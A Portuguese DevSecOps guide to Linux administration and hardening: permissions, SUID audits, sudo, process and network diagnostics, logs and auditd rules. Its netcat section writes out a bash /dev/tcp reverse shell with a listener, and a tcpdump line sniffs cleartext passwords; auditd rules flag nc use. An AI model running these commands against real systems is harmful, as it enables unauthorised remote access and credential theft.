---
title: "Linux — Guia Técnico para DevSecOps e Cybersecurity"
tags:
  - linux
  - devsecops
  - devops
  - cybersecurity
  - hardening
  - bash
  - sysadmin
  - auditoria
  - permissoes
  - networking
  - logs
aliases:
  - "Linux DevSecOps"
  - "Linux Hardening"
  - "Sysadmin Guide"
created: 2026-03-02
updated: 2026-03-02
status: ativo
nivel: intermediario-avancado
relacionado:
  - "[[01_Fundamentos/Redes]]"
  - "[[01_Fundamentos/Conteiners]]"
  - "[[02_Ferramentas_Stack/Tenable]]"
---
# 🐧 Linux — Guia Técnico para DevSecOps e Cybersecurity

> [!INFO] Por que Linux? Mais de **96% dos servidores web**, **100% dos containers Docker** e toda a infraestrutura de nuvem rodam sobre o Kernel Linux. Para um profissional de DevSecOps ou Cybersecurity, dominar Linux não é opcional — é o pré-requisito para tudo o mais.

---

## 📋 Índice

- [[#1. Sistema de Arquivos e Hierarquia]]
- [[#2. Permissões e Controle de Acesso]]
- [[#3. Usuários Grupos e Privilégios]]
- [[#4. Processos e Monitoramento de Sistema]]
- [[#5. Rede e Diagnóstico]]
- [[#6. Manipulação de Arquivos e Texto]]
- [[#7. Logs e Auditoria]]
- [[#8. Gerenciamento de Serviços systemd]]
- [[#9. Gerenciamento de Pacotes]]
- [[#10. Hardening e Segurança de Host]]
- [[#11. Bash Scripting para Automação]]
- [[#12. Referência Rápida — Cheat Sheet]]

---

## 1. Sistema de Arquivos e Hierarquia

### 1.1 FHS — Filesystem Hierarchy Standard

O Linux segue um padrão de hierarquia de diretórios. Saber onde cada coisa fica é fundamental para auditoria e hardening.

```yaml
/                   # Raiz do sistema (root)
├── /bin            # Binários essenciais (ls, cp, mv) — todos os usuários
├── /sbin           # Binários de sistema (fdisk, iptables) — root only
├── /usr/           # Programas instalados pelo usuário
│   ├── /usr/bin    # Binários de aplicativos (python3, git, curl)
│   ├── /usr/local  # Programas compilados/instalados manualmente
│   └── /usr/share  # Dados compartilhados (docs, ícones)
├── /etc/           # ⚠️ ARQUIVOS DE CONFIGURAÇÃO DO SISTEMA
│   ├── passwd      # Lista de usuários (sem senhas)
│   ├── shadow      # Hashes de senhas (root only!)
│   ├── sudoers     # Quem pode usar sudo
│   ├── ssh/        # Configuração do servidor SSH
│   ├── cron.d/     # Agendamentos de tarefas
│   └── hosts       # Resolução de nomes local
├── /var/           # Dados variáveis (crescem com o tempo)
│   ├── /var/log    # ⚠️ LOGS DO SISTEMA (primeiro lugar em forense)
│   ├── /var/www    # Arquivos de sites web
│   └── /var/tmp    # Temporários persistentes entre reboots
├── /tmp/           # Temporários (apagados no reboot) — world-writable!
├── /home/          # Diretórios dos usuários (/home/ana, /home/carlos)
├── /root/          # Home do usuário root
├── /proc/          # FS virtual — estado atual do kernel em tempo real
│   ├── /proc/PID   # Informações de cada processo em execução
│   ├── /proc/net   # Estado das conexões de rede
│   └── /proc/sys   # Parâmetros do kernel (editáveis via sysctl)
├── /sys/           # FS virtual — hardware e drivers
├── /dev/           # Dispositivos (discos, terminais, /dev/null, /dev/random)
├── /run/           # Dados de runtime (PIDs, sockets — apagados no reboot)
├── /boot/          # Kernel, initrd, bootloader (GRUB)
├── /lib            # Bibliotecas compartilhadas essenciais
├── /opt/           # Software de terceiros instalado manualmente
└── /mnt/ /media/   # Pontos de montagem (discos externos, NFS)
```

> [!WARNING] Diretórios críticos para segurança `/etc/shadow`, `/etc/sudoers` e `/etc/ssh/` são os alvos mais sensíveis. Um atacante com acesso de leitura ao `/etc/shadow` pode crackear senhas offline. Audite as permissões desses arquivos regularmente.

---

### 1.2 Pontos de Montagem e Particionamento Seguro

```bash
# Ver todos os sistemas de arquivos montados e uso de disco
df -hT

# Saída típica:
# Filesystem     Type      Size  Used Avail Use% Mounted on
# /dev/sda1      ext4       50G   12G   38G  24% /
# /dev/sda2      ext4      100G   45G   55G  45% /var
# tmpfs          tmpfs     3.9G     0  3.9G   0% /dev/shm

# Ver uso de inodes (arquivos) — importante: disco cheio de inodes = sistema para
df -i

# Ver espaço ocupado por diretório (depth 1)
du -h --max-depth=1 /var/log | sort -rh

# Ver partições e discos
lsblk
fdisk -l

# Montar com opções de segurança
mount -o nosuid,noexec,nodev /dev/sdb1 /mnt/dados
# nosuid  : ignora bits SUID/SGID — previne escalação de privilégio
# noexec  : impede execução de binários — previne runs de malware
# nodev   : ignora arquivos de dispositivo — previne device file attacks
```

---

## 2. Permissões e Controle de Acesso

### 2.1 Modelo Clássico rwx

```
Exemplo: -rwxr-x--- 1 alice devops 4096 Mar 02 10:00 deploy.sh
          ││││││││││
          │└┤└┤└┤└┘└─── Outros (Others)
          │ │ │ └─────── Grupo (Group)
          │ │ └───────── Dono (Owner)
          │ └─────────── Tipo: - arquivo | d diretório | l link | c dispositivo
          └───────────── Formato especial

Bits: r=4  w=2  x=1  -=0

Exemplos numéricos:
  rwxrwxrwx = 777 ← Nunca em produção!
  rwxr-xr-x = 755 ← Executáveis públicos (scripts, binários)
  rwxr-x--- = 750 ← Script do dono, grupo executa, outros sem acesso
  rw-r--r-- = 644 ← Arquivos de configuração (leitura pública)
  rw-r----- = 640 ← Config com informações sensíveis (ex: /etc/shadow-like)
  rw------- = 600 ← Chaves privadas, arquivos confidenciais
  rwx------ = 700 ← Diretório privado do usuário
```

```bash
# Alterar dono e grupo
chown usuario:grupo arquivo.txt
chown -R www-data:www-data /var/www/html/     # Recursivo

# Alterar permissões — notação octal
chmod 750 deploy.sh
chmod -R 640 /etc/nginx/conf.d/

# Alterar permissões — notação simbólica (mais legível)
chmod u+x script.sh           # Adiciona execução para o dono
chmod g-w arquivo.conf        # Remove escrita do grupo
chmod o= arquivo_secreto.key  # Remove TODAS as permissões dos outros
chmod a+r README.md           # Adiciona leitura para todos (all)

# Ver permissões detalhadas
ls -la /etc/ssh/
stat /etc/passwd
```

---

### 2.2 Bits Especiais — SUID, SGID e Sticky Bit

```yaml
SUID (Set User ID) — bit 4:
  Efeito: Executa o binário com as permissões do DONO, não de quem rodou
  Representação: s no lugar do x do dono (rwsr-xr-x)
  Exemplo legítimo: /usr/bin/passwd (precisa escrever em /etc/shadow como root)
  Risco: SUID em binários arbitrários = escalada de privilégio garantida
  Detecção: find / -perm /4000 -type f 2>/dev/null

SGID (Set Group ID) — bit 2:
  Em arquivo: Executa com permissões do grupo do arquivo
  Em diretório: Novos arquivos criados herdam o grupo do diretório
  Representação: s no lugar do x do grupo (rwxr-sr-x)
  Uso legítimo: Diretórios compartilhados de equipe (/var/www, /proj/shared)
  Detecção: find / -perm /2000 -type f 2>/dev/null

Sticky Bit — bit 1:
  Efeito: Apenas o DONO do arquivo pode deletá-lo (mesmo que outros tenham w no dir)
  Representação: t no lugar do x dos outros (rwxrwxrwt)
  Uso: /tmp — world-writable mas sem risco de um usuário deletar arquivos de outro
  Configurar: chmod +t /diretorio_compartilhado
```

```bash
# Auditoria de SUID/SGID — EXECUTE ISSO regularmente
find / -perm /4000 -type f -exec ls -la {} \; 2>/dev/null   # SUID
find / -perm /2000 -type f -exec ls -la {} \; 2>/dev/null   # SGID
find / \( -perm /4000 -o -perm /2000 \) -type f 2>/dev/null # Ambos

# Remover SUID de binário desnecessário
chmod u-s /usr/bin/at          # Exemplo: binário 'at' raramente necessário

# Atributos imutáveis (chattr) — além do rwx
sudo chattr +i /etc/resolv.conf    # +i: imutável — nem root apaga
sudo chattr +a /var/log/auth.log   # +a: append-only — só adiciona, não edita
lsattr /etc/                        # Lista atributos
sudo chattr -i /etc/resolv.conf    # Remove proteção

# /tmp e /var/tmp: verificar sticky bit
ls -ld /tmp
# drwxrwxrwt 10 root root 4096 ...   ← O 't' final deve estar presente!
```

> [!WARNING] SUID Root é uma superfície de ataque Qualquer binário com SUID e permissão de escrita para usuários não-privilegiados pode ser substituído por um payload malicioso. Mantenha uma baseline dos binários SUID e compare regularmente: `find / -perm /4000 2>/dev/null | sort > /root/suid_baseline.txt`

---

### 2.3 ACLs — Access Control Lists (Permissões Granulares)

As ACLs permitem permissões além do modelo básico rwx — essenciais em ambientes multi-equipe.

```bash
# Verificar se ACL está habilitada no sistema de arquivos
mount | grep acl

# Ver ACLs de um arquivo
getfacl /var/www/html/config.php

# Dar permissão de leitura apenas para o usuário 'sonarqube' (sem mudar grupo)
setfacl -m u:sonarqube:r /etc/app/config.env

# Dar permissão de leitura/execução para um grupo específico
setfacl -m g:developers:rx /opt/scripts/

# ACL padrão para diretório (novos arquivos herdam)
setfacl -d -m g:developers:rw /var/shared/

# Remover ACL específica
setfacl -x u:sonarqube /etc/app/config.env

# Remover todas as ACLs
setfacl -b /etc/app/config.env
```

---

## 3. Usuários, Grupos e Privilégios

### 3.1 Gerenciamento de Usuários

```bash
# Criar usuário com home e shell (padrão para humanos)
useradd -m -s /bin/bash -c "DevSecOps Analyst" devsec01
passwd devsec01

# Criar usuário de sistema (sem home, sem login — para serviços)
useradd --system --no-create-home --shell /usr/sbin/nologin nginx-worker
# Isso garante que mesmo comprometendo o processo, não há shell interativo

# Modificar usuário existente
usermod -aG docker devsec01      # Adiciona ao grupo docker (sem remover outros grupos!)
usermod -aG sudo devsec01        # Adiciona ao grupo sudo
usermod -L devsec01              # LOCK — desabilita o login
usermod -U devsec01              # UNLOCK — reabilita

# Expirar senha (força troca no próximo login)
chage -d 0 devsec01

# Ver política de senha do usuário
chage -l devsec01

# Deletar usuário (e seus arquivos)
userdel -r devsec01

# Arquivos críticos de usuários
cat /etc/passwd     # Usuários: login:x:UID:GID:info:home:shell
cat /etc/shadow     # Hashes de senha (apenas root)
cat /etc/group      # Grupos: nome:x:GID:membros
```

**Anatomia do `/etc/passwd`:**

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
devsec01:x:1001:1001:DevSecOps Analyst:/home/devsec01:/bin/bash
│        │ │    │    │                  │               └── Shell
│        │ │    │    │                  └── Home directory
│        │ │    │    └── Comentário/Info
│        │ │    └── GID primário
│        │ └── UID
│        └── x = senha em /etc/shadow
└── Username
```

---

### 3.2 sudo — Princípio do Menor Privilégio

```bash
# Editar sudoers SEMPRE com visudo (valida sintaxe antes de salvar!)
sudo visudo

# Editar arquivo específico por usuário/grupo (melhor prática)
sudo visudo -f /etc/sudoers.d/devsec-team
```

```bash
# /etc/sudoers.d/devsec-team

# Grupo pode reiniciar serviços específicos sem senha
%devsec-ops ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx, \
                                 /usr/bin/systemctl restart app-backend

# Usuário pode rodar script específico como root
deploy-bot ALL=(root) NOPASSWD: /opt/scripts/deploy.sh

# Proibir comandos perigosos mesmo com sudo (raramente usado, mas existe)
devsec01 ALL=(ALL) ALL, !/bin/bash, !/bin/sh, !/usr/bin/su
```

```bash
# Ver o que o usuário atual pode fazer com sudo
sudo -l

# Rodar comando como outro usuário (não necessariamente root)
sudo -u www-data php artisan migrate

# Logar como root (com ambiente do root)
sudo -i

# Sudo com variável de ambiente preservada
sudo -E python3 /opt/scripts/scanner.py

# Auditoria: ver histórico de sudo
grep sudo /var/log/auth.log
journalctl | grep sudo
```

> [!NOTE] Princípio do Menor Privilégio no sudo Nunca use `ALL=(ALL) NOPASSWD: ALL` em produção. Dê permissão apenas para os comandos específicos que o serviço ou usuário precisa. Um processo comprometido com sudo irrestrito equivale a root comprometido.

---

## 4. Processos e Monitoramento de Sistema

### 4.1 Monitoramento em Tempo Real

```bash
# htop — monitor visual interativo (instalar se necessário)
htop
# Atalhos úteis no htop:
#   F4 = filtrar por nome
#   F5 = visão de árvore de processos
#   F9 = matar processo
#   u  = filtrar por usuário

# top — nativo, sem instalação
top
# Pressione:
#   Shift+M = ordenar por memória
#   Shift+P = ordenar por CPU
#   c = mostrar comando completo

# Informações de carga do sistema
uptime
# 10:42:33 up 12 days, 3:22,  2 users,  load average: 0.45, 0.60, 0.72
#                                                       ↑1min  ↑5min ↑15min
# Regra: load average > nº de CPUs = sistema sobrecarregado

# Ver quantas CPUs lógicas tem o sistema
nproc
cat /proc/cpuinfo | grep "processor" | wc -l

# Uso de memória
free -h
cat /proc/meminfo
```

---

### 4.2 Análise de Processos

```bash
# Snapshot completo de processos
ps aux
# a = todos os usuários | u = formato detalhado | x = processos sem TTY

# Árvore de processos (pai → filho)
ps auxf
pstree -p

# Ver processo específico
ps aux | grep "[n]ginx"   # O [] evita que o próprio grep apareça

# Ver comandos completos (sem truncar)
ps aux --no-header --width=9999

# Ver threads de um processo
ps -eLf | grep PID

# Informações detalhadas de um processo via /proc
cat /proc/1234/cmdline | tr '\0' ' '    # Comando exato com argumentos
cat /proc/1234/environ | tr '\0' '\n'   # Variáveis de ambiente do processo
ls -la /proc/1234/fd/                   # Arquivos abertos pelo processo
cat /proc/1234/net/tcp                  # Conexões de rede do processo
```

---

### 4.3 Sinais e Controle de Processos

```yaml
Sinais mais importantes:

  SIGHUP  (1):  "Recarregue sua configuração"
    Uso: kill -1 PID | kill -HUP PID
    Efeito: Processo relê config sem reiniciar
    Exemplo: nginx -s reload (internamente envia SIGHUP)

  SIGINT  (2):  "Interrompa" (equivale ao Ctrl+C no terminal)
    Uso: kill -2 PID
    Efeito: Encerramento gracioso (processo pode limpar recursos)

  SIGTERM (15): "Termine gentilmente" (PADRÃO do kill)
    Uso: kill PID | kill -15 PID
    Efeito: Solicita encerramento — processo PODE ignorar (raramente)
    Uso em scripts: sempre tentar SIGTERM antes do SIGKILL

  SIGKILL (9):  "TERMINE AGORA" — não pode ser ignorado pelo processo
    Uso: kill -9 PID | kill -KILL PID
    Efeito: Kernel encerra o processo imediatamente, sem limpeza
    ⚠️ Pode deixar arquivos temporários, locks e sockets sujos

  SIGSTOP (19): "Pause" — suspende execução (não pode ser ignorado)
    Uso: kill -19 PID
    Retomar: kill -18 PID (SIGCONT)
```

```bash
# Matar processo pelo PID
kill 1234              # SIGTERM
kill -9 1234           # SIGKILL
kill -HUP 1234         # Recarregar config

# Matar por nome (CUIDADO: mata TODOS os processos com esse nome)
pkill nginx            # SIGTERM para todos os 'nginx'
pkill -9 -u www-data   # Mata todos os processos do usuário www-data

# killall (por nome exato)
killall -HUP sshd

# Verificar se processo ainda existe
kill -0 PID 2>/dev/null && echo "Processo existe" || echo "Processo morto"

# Prioridade de CPU (nice / renice)
nice -n 10 python3 scanner.py      # Iniciar com prioridade baixa (10)
renice -n 5 -p 1234                # Ajustar prioridade de processo em execução
# Range: -20 (maior prioridade) a +19 (menor)
# Apenas root pode definir valores negativos (alta prioridade)
```

---

### 4.4 `lsof` — Análise de Arquivos Abertos

> [!NOTE] No Linux, tudo é arquivo Conexões de rede, pipes, sockets, dispositivos — tudo é representado como arquivo. O `lsof` (List Open Files) é uma das ferramentas mais poderosas para análise forense e troubleshooting.

```bash
# Todos os arquivos abertos pelo sistema (muito output — filtre sempre)
lsof | head -50

# Quem está escutando/usando uma porta específica
lsof -i :443
lsof -i :22
lsof -i TCP:8080

# Todas as conexões de rede abertas
lsof -i

# Conexões de um processo específico
lsof -p 1234

# Todos os arquivos abertos por um usuário
lsof -u www-data

# Quem está usando um arquivo ou diretório
lsof /var/log/nginx/access.log
lsof +D /var/www/html/         # Recursivo no diretório

# Processos com conexões de rede estabelecidas (detectar C2 / backdoors)
lsof -i -n -P | grep ESTABLISHED

# Ver arquivos deletados mas ainda em uso (vazamento de disco clássico!)
lsof | grep deleted
# Um arquivo deletado mas aberto por um processo ainda ocupa espaço em disco
```

---

### 4.5 Diagnóstico de Performance

```bash
# iostat — uso de disco I/O
iostat -x 2 5    # Estatísticas estendidas, a cada 2s, 5 vezes

# vmstat — memória, swap, I/O, CPU
vmstat 2 10

# sar — histórico de performance do sistema (requer sysstat)
sar -u 1 10      # CPU
sar -r 1 10      # Memória
sar -n DEV 1 5   # Rede por interface

# Verificar se há process em estado D (uninterruptible sleep = problema de I/O)
ps aux | awk '$8 == "D" {print $0}'

# Verificar uso de swap (swap alto = problema de memória)
swapon --show
cat /proc/swaps
```

---

## 5. Rede e Diagnóstico

### 5.1 Interfaces e Endereçamento

```bash
# Ver todas as interfaces e seus IPs (substitui o depreciado ifconfig)
ip addr show
ip a              # abreviação

# Ver IP de uma interface específica
ip addr show eth0

# Interface e rota em uma linha (útil em scripts)
ip -brief addr show

# Ver tabela de roteamento (substitui route -n)
ip route show
ip r

# Verificar gateway padrão
ip route show default
# default via 10.0.0.1 dev eth0 proto dhcp src 10.0.1.50 metric 100

# Adicionar/remover rota temporária
ip route add 192.168.100.0/24 via 10.0.0.254
ip route del 192.168.100.0/24

# Tabela ARP — vizinhos conhecidos
ip neigh show
arp -n

# Ver estatísticas de interface (erros, drops, bytes)
ip -s link show eth0

# Ativar/desativar interface
ip link set eth0 up
ip link set eth0 down
```

---

### 5.2 `ss` — Análise de Sockets (Substitui netstat)

```bash
# COMANDO MAIS USADO: todas as portas em escuta com processo
sudo ss -tulpn
# -t = TCP | -u = UDP | -l = listening | -p = processo | -n = números (sem resolução DNS)

# Saída típica:
# Netid  State   Recv-Q Send-Q Local Address:Port  Peer Address:Port Process
# tcp    LISTEN  0      128    0.0.0.0:22           0.0.0.0:*     users:(("sshd",pid=890))
# tcp    LISTEN  0      511    0.0.0.0:80           0.0.0.0:*     users:(("nginx",pid=1234))

# Ver todas as conexões TCP estabelecidas
ss -tn state established

# Ver conexões de um processo específico (por PID)
ss -p | grep 1234

# Ver conexões de um serviço específico
ss -tnp | grep nginx

# Contar conexões por estado (útil para detectar SYN flood)
ss -s

# Conexões por IP remoto (detectar scanning)
ss -tn | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head

# Ver sockets Unix (comunicação local entre processos)
ss -xl
```

> [!NOTE] ss vs netstat `netstat` foi depreciado e removido de distribuições modernas. Use sempre `ss`. Para instalar o `netstat` legado: `apt install net-tools` (não recomendado em novos ambientes).

---

### 5.3 Diagnóstico de Conectividade

```bash
# ping — verificar alcançabilidade e latência
ping -c 4 8.8.8.8             # 4 pacotes
ping -c 4 -I eth0 8.8.8.8    # Forçar interface específica
ping6 ::1                     # IPv6

# traceroute / tracepath — caminho até o destino
traceroute -n 8.8.8.8        # -n = sem resolução DNS (mais rápido)
tracepath 8.8.8.8            # Alternativa sem root

# mtr — combinação de ping + traceroute em tempo real
mtr --report --report-cycles 10 8.8.8.8

# DNS — resolução de nomes
dig google.com                     # Consulta DNS completa
dig google.com A                   # Apenas registro A (IPv4)
dig google.com AAAA                # IPv6
dig -x 8.8.8.8                    # DNS reverso
dig @8.8.8.8 google.com           # Consultar DNS específico
dig +short google.com             # Apenas o IP (útil em scripts)
nslookup google.com               # Alternativa simples

# Verificar resolução DNS configurada
cat /etc/resolv.conf
resolvectl status                  # systemd-resolved

# curl — testar endpoints HTTP/HTTPS
curl -I https://site.com                          # Apenas headers (detecta versão do servidor)
curl -v https://site.com                          # Verbose (conexão TLS completa)
curl -s -o /dev/null -w "%{http_code}" https://site.com  # Apenas status code
curl -k https://site.com                          # Ignorar certificado inválido (lab only!)
curl --connect-timeout 5 --max-time 10 https://site.com  # Timeouts
curl -H "Authorization: Bearer TOKEN" https://api.site.com/v1/users  # Com header

# wget — download de arquivos
wget -q https://site.com/arquivo.tar.gz
wget --spider https://site.com     # Verifica se URL existe sem baixar
```

---

### 5.4 `tcpdump` — Captura de Pacotes

```bash
# Captura básica em interface
sudo tcpdump -i eth0

# Captura com filtros (Berkeley Packet Filter — BPF)
sudo tcpdump -i eth0 host 10.0.1.100                  # Filtrar por host
sudo tcpdump -i eth0 port 443                          # Filtrar por porta
sudo tcpdump -i eth0 src 10.0.1.100 and dst port 80   # Origem + destino
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'   # Apenas pacotes SYN

# Captura com output legível e salvo em arquivo
sudo tcpdump -i eth0 -s 0 -w /tmp/captura.pcap        # -s 0 = captura completa
sudo tcpdump -r /tmp/captura.pcap                      # Ler arquivo

# Captura de senhas em cleartext (HTTP, FTP, Telnet) — para labs ou pentest autorizado
sudo tcpdump -i eth0 -A -s 0 port 80 | grep -i "password\|passwd\|Authorization"

# Ver sem resolução de nomes (mais rápido)
sudo tcpdump -i eth0 -n -nn port 22

# Capturar tráfego de um container Docker
sudo tcpdump -i docker0
sudo tcpdump -i br-<network-id>
```

---

### 5.5 `nc` (Netcat) — Canivete Suíço de Rede

```bash
# Testar se uma porta está aberta (-v verbose, -z scan sem dados, -w timeout)
nc -vz 192.168.1.50 3306
nc -vz 10.0.0.1 22

# Scan de múltiplas portas
nc -vz 10.0.0.1 20-25

# Criar servidor simples para teste (escuta na porta 8080)
nc -l -p 8080

# Transferir arquivo via rede (sem SSH)
# No receptor:
nc -l -p 9999 > arquivo_recebido.tar.gz
# No emissor:
nc 192.168.1.100 9999 < arquivo.tar.gz

# Testar banner de serviço (fingerprinting)
echo "" | nc -vn 192.168.1.1 22     # Banner SSH
echo "HEAD / HTTP/1.0\r\n\r\n" | nc 192.168.1.1 80  # Banner HTTP

# Reverse shell (apenas em labs autorizados / pentest)
# Receptor (atacante):
nc -l -p 4444 -v
# Emissor (alvo — simula execução de payload):
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

> [!WARNING] Netcat em Produção O `nc` é frequentemente instalado por atacantes para criar backdoors e exfiltrar dados. Monitore o uso de `nc` nos logs e considere removê-lo ou restringi-lo em hosts de produção. Detecte com: `auditctl -w /usr/bin/nc -p x -k netcat_usage`

---

## 6. Manipulação de Arquivos e Texto

### 6.1 `grep` — Busca em Texto

```bash
# Busca básica
grep "ERROR" /var/log/app.log

# Opções essenciais
grep -r "password" /var/www/          # Recursivo em diretório
grep -i "error" arquivo.log           # Case-insensitive
grep -n "FATAL" arquivo.log           # Mostra número da linha
grep -v "DEBUG" arquivo.log           # Inverte (exclui matches)
grep -c "ERROR" arquivo.log           # Conta ocorrências
grep -l "API_KEY" /etc/               # Apenas nomes dos arquivos

# Contexto ao redor do match
grep -A 3 "EXCEPTION" app.log         # 3 linhas Depois (After)
grep -B 3 "EXCEPTION" app.log         # 3 linhas Antes (Before)
grep -C 3 "EXCEPTION" app.log         # 3 linhas dos dois lados (Context)

# Regex estendido (-E ou egrep)
grep -E "(ERROR|FATAL|CRITICAL)" app.log
grep -E "^[0-9]{4}-[0-9]{2}-[0-9]{2}" app.log   # Linhas que começam com data

# Busca de credenciais expostas em repositórios (DevSecOps)
grep -rE "(password|passwd|pwd|secret|api_key|token|bearer)\s*[=:]\s*['\"]?\w+" \
  --include="*.env" --include="*.yml" --include="*.yaml" \
  --include="*.json" --include="*.config" .
```

---

### 6.2 `find` — Busca Avançada de Arquivos

```bash
# Estrutura básica: find [onde] [critério] [ação]

# Arquivos modificados recentemente (forense — "o que mudou?")
find /etc -mmin -60 -type f              # Modificados na última hora
find / -mtime -1 -type f 2>/dev/null     # Modificados nas últimas 24h

# Arquivos grandes (detectar dumps, backups não autorizados)
find / -type f -size +100M 2>/dev/null
find /tmp /var/tmp -type f -size +10M    # Focar em diretórios temporários

# Arquivos com permissões inseguras
find / -type f -perm 0777 2>/dev/null              # World-writable
find / -type f -perm /o+w 2>/dev/null              # Qualquer escrita por outros
find / -type d -perm /o+w -not -path "/proc/*" 2>/dev/null  # Diretórios world-writable

# Arquivos sem dono (possível rastro de intrusão)
find / -nouser -o -nogroup 2>/dev/null

# Busca por nome e extensão
find /home -name "*.bash_history" -type f           # Histórico de todos os usuários
find /tmp /var/tmp -name "*.sh" -o -name "*.py"    # Scripts em /tmp (suspeito!)

# Combinando com exec (executar comando para cada resultado)
find / -perm /4000 -type f -exec ls -la {} \;      # SUID com detalhes
find /var/log -name "*.log" -mtime +30 -exec gzip {} \;  # Comprimir logs velhos

# Busca por conteúdo em múltiplos arquivos (grep + find)
find /etc -type f -exec grep -l "PermitRootLogin" {} \;
```

---

### 6.3 `awk`, `sed`, `cut`, `sort`, `uniq` — Pipeline de Texto

```bash
# awk — processamento de colunas
awk '{print $1, $7}' /var/log/nginx/access.log          # IP e URL requisitada
awk -F: '{print $1, $3}' /etc/passwd                    # Usuário e UID
awk '$9 == "404" {print $1, $7}' access.log             # IPs com 404
awk 'NR%2==0' arquivo.txt                               # Linhas pares

# sed — substituição e edição de stream
sed 's/senha123/[REDACTED]/g' config_backup.txt         # Substituir
sed -n '10,20p' arquivo.log                             # Imprimir linhas 10 a 20
sed '/^#/d' /etc/ssh/sshd_config | sed '/^$/d'         # Remover comentários e linhas vazias
sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config  # Editar in-place

# cut — extrair colunas
cut -d: -f1 /etc/passwd                                 # Apenas usernames
cut -d' ' -f1 /var/log/nginx/access.log                 # Apenas IPs
cut -c1-15 arquivo.txt                                  # Primeiros 15 caracteres

# sort e uniq — ordenar e deduplicar
cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
# ↑ Top 20 IPs por número de requisições

# Detectar IPs com muitas requisições (DDoS / scanning)
awk '{print $1}' /var/log/nginx/access.log | \
  sort | uniq -c | sort -rn | \
  awk '$1 > 1000 {print "ALERTA:", $1, "requisições de", $2}'

# Pipeline completo: IPs com falhas de autenticação SSH
grep "Failed password" /var/log/auth.log | \
  awk '{print $(NF-3)}' | \
  sort | uniq -c | sort -rn | head -10
```

---

## 7. Logs e Auditoria

### 7.1 Mapa de Logs do Sistema

```yaml
logs_criticos:

  /var/log/auth.log:              # Debian/Ubuntu
    equivalente_rhel: /var/log/secure
    conteudo:
      - Tentativas de login SSH (sucesso e falha)
      - Uso de sudo (quem, quando, qual comando)
      - Autenticações PAM
      - Criação/modificação de usuários
    monitorar: "grep 'Failed\|Invalid\|sudo\|useradd' /var/log/auth.log"

  /var/log/syslog:               # Debian/Ubuntu
    equivalente_rhel: /var/log/messages
    conteudo:
      - Logs gerais do sistema e daemons
      - Mensagens do kernel
      - Inicialização de serviços
    monitorar: "grep -i 'error\|warn\|crit' /var/log/syslog"

  /var/log/kern.log:
    conteudo:
      - Mensagens do kernel
      - Erros de hardware
      - Módulos carregados/descarregados (rootkits carregam módulos!)
    monitorar: "dmesg -T | grep -i 'error\|warn'"

  /var/log/dmesg:
    conteudo:
      - Ring buffer do kernel (boot + hardware)
    monitorar: "dmesg -T --level=err,warn"

  /var/log/nginx/ ou /var/log/apache2/:
    conteudo:
      - access.log: Todas as requisições HTTP
      - error.log: Erros e warnings do servidor
    monitorar: "grep ' 4[0-9][0-9] \| 5[0-9][0-9] ' access.log"

  /var/log/cron:
    conteudo:
      - Execuções de cron jobs (agendamentos)
    monitorar: "Verificar cron jobs não esperados — vetor de persistência de malware"

  ~/.bash_history:
    conteudo:
      - Histórico de comandos do usuário
    nota: "Atacantes frequentemente fazem: export HISTFILE=/dev/null ou history -c"
```

---

### 7.2 `journalctl` — Logs Centralizados (systemd)

```bash
# Ver todos os logs (mais recentes ao final)
journalctl

# Seguir logs em tempo real (como tail -f)
journalctl -f

# Logs de um serviço específico
journalctl -u nginx
journalctl -u sshd -f             # Follow em tempo real
journalctl -u docker --since "1 hour ago"

# Filtrar por prioridade
journalctl -p err                 # Apenas erros
journalctl -p warning             # Warnings e acima

# Filtrar por tempo
journalctl --since "2026-03-01 00:00:00"
journalctl --since "yesterday"
journalctl --since "1 hour ago" --until "30 min ago"

# Ver logs do boot atual
journalctl -b 0                   # Boot atual
journalctl -b -1                  # Boot anterior

# Ver logs de processo específico (por PID)
journalctl _PID=1234

# Output em JSON (para parsing)
journalctl -u nginx -o json | python3 -m json.tool | head -50

# Verificar uso de disco pelo journal
journalctl --disk-usage

# Limitar tamanho (em /etc/systemd/journald.conf)
# SystemMaxUse=500M
```

---

### 7.3 Auditoria com `auditd`

O `auditd` é o sistema de auditoria do kernel Linux — registra chamadas de sistema com precisão cirúrgica.

```bash
# Instalar
apt install auditd audispd-plugins    # Debian/Ubuntu
yum install audit                     # RHEL/CentOS

# Verificar status
systemctl status auditd
auditctl -s                           # Status das regras ativas

# Adicionar regras de auditoria
# Monitorar acesso a arquivo crítico
auditctl -w /etc/passwd -p wa -k identity_changes
auditctl -w /etc/shadow -p wa -k shadow_changes
auditctl -w /etc/sudoers -p wa -k sudoers_changes

# Monitorar execução de comandos privilegiados
auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -k root_commands

# Monitorar uso de netcat e ferramentas de rede suspeitas
auditctl -w /usr/bin/nc -p x -k suspicious_network
auditctl -w /usr/bin/ncat -p x -k suspicious_network
auditctl -w /usr/bin/netcat -p x -k suspicious_network

# Ver logs de auditoria
ausearch -k identity_changes                # Por chave
ausearch -k root_commands --start today     # Desde hoje
ausearch -i -c passwd                       # Execuções do comando passwd

# Relatório de auditoria
aureport --summary                          # Sumário geral
aureport --auth                             # Autenticações
aureport --login                            # Logins
aureport -x --summary                       # Execuções de comandos

# Regras persistentes (carregadas no boot)
# /etc/audit/rules.d/security.rules
```

**Arquivo de regras de auditoria para produção:**

```bash
# /etc/audit/rules.d/99-security.rules

# Limpar regras existentes
-D

# Buffer size
-b 8192

# Monitorar arquivos críticos
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/gshadow -p wa -k identity
-w /etc/sudoers -p wa -k sudo_changes
-w /etc/sudoers.d/ -p wa -k sudo_changes
-w /etc/ssh/sshd_config -p wa -k sshd_config

# Monitorar diretórios de administração
-w /sbin/ -p wa -k system_binaries
-w /usr/sbin/ -p wa -k system_binaries

# Monitorar cron (vetor de persistência)
-w /etc/cron.d/ -p wa -k cron
-w /etc/crontab -p wa -k cron
-w /var/spool/cron/ -p wa -k cron

# Chamadas de sistema suspeitas
-a always,exit -F arch=b64 -S ptrace -k process_injection
-a always,exit -F arch=b64 -S mount -k mounts

# Tornar regras imutáveis (requer reboot para mudar)
-e 2
```

---

